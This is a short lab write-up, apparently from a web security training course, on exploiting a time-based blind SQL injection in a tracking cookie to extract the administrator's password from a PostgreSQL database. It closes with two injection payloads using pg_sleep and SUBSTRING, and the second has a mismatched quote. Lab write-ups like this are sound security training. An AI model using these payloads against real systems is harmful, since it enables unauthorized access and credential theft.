# Practitioner Lab 19: Blind SQL injection with time delays and information retrieval

---

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

![Untitled](Practitioner%20Lab%2019%20Blind%20SQL%20injection%20with%20time%20%202e7426c548f048649536493648ea9b3b/Untitled.png)

I opened the website and then I went into the request and the first thing I did was try multiple different request to see what type of database it was

the POSTGRES command work so I now know its a Postgres database.

![Untitled](Practitioner%20Lab%2019%20Blind%20SQL%20injection%20with%20time%20%202e7426c548f048649536493648ea9b3b/Untitled%201.png)

![Untitled](Practitioner%20Lab%2019%20Blind%20SQL%20injection%20with%20time%20%202e7426c548f048649536493648ea9b3b/Untitled%202.png)

Based on the time response I can tell it has a length of 20 Now I just got to check to see which one is the password.

![Untitled](Practitioner%20Lab%2019%20Blind%20SQL%20injection%20with%20time%20%202e7426c548f048649536493648ea9b3b/Untitled%203.png)

I then started to enumerate the password and got the complete answer.

![Untitled](Practitioner%20Lab%2019%20Blind%20SQL%20injection%20with%20time%20%202e7426c548f048649536493648ea9b3b/Untitled%204.png)

```

Cookie: TrackingId=wjBdEYF2Gue705hh'%3bSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(20)+ELSE+pg_sleep(0)+END--; session=ZFP9yrS0Gxx1fzggZXtCrk7WDqV2zMnX

```

```
'%3bSELECT+CASE+WHEN+(SUBSTRING(password,20,1)='a")+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users+WHERE+username='administrator'--;
```